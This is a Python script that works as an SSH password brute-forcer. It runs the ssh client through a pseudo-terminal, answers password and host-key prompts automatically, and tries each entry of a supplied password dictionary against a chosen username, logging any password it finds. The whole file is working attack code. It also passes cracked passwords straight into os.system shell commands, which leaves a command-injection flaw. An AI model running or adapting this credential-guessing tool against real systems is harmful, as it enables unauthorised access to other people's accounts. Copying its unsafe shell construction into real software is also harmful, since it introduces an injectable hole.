import pty
import os
from os import waitpid, execv, read, write

class ssh():
    def __init__(self, host, execute='echo "done" > ~/testing.txt', 
                 askpass=False, user='victim', password=b'passwords'):
        self.exec_ = execute
        self.host = host
        self.user = user
        self.password = password
        self.askpass = askpass
        self.run()

    def run(self):
        command = [
                '/usr/bin/ssh',
                self.user+'@'+self.host,
                '-o', 'NumberOfPasswordPrompts=1',
                self.exec_,
        ]

        pid, child_fd = pty.fork()

        if not pid:
            execv(command[0], command)

        while self.askpass:
            try:
                output = read(child_fd, 1024).strip()
            except:
                break
            lower = output.lower()
            if b'password:' in lower:
                write(child_fd, self.password + b'\n')
                break
            elif b'are you sure you want to continue connecting' in lower:
                write(child_fd, b'yes\n')
            else:
                print('Error:', output)

        output = []
        while True:
            try:
                output.append(read(child_fd, 1024).strip())
            except:
                break

        waitpid(pid, 0)
        return b''.join(output)

if __name__ == "__main__":
	user = input("Enter the username you want to crack: \n")
	dictionary_path = input("Enter relative path to passwords dictionary: \n")
	dictionary = open(dictionary_path, "r")

	output_file = '~/bruteforce_summary.txt'

	print("[*] Cracking Password For: " + user)

	is_found = False
	for l in dictionary:
		s = ssh("localhost", execute="ls ~/", askpass=True, user=user, password=l[0:len(l) - 1].encode())
		if 'Permission denied' not in str(s.run()):
			print("[+] Found Password: " + l[0:len(l) - 1] +"\n")
			is_found = True
			os.system('echo [+] Found Password: ' + l[0:len(l) - 1] + ' >> ' + output_file)
			break

	if not is_found:
		os.system('echo [-] Password Not Found >> ' + output_file)
		print("[-] Password Not Found.\n")
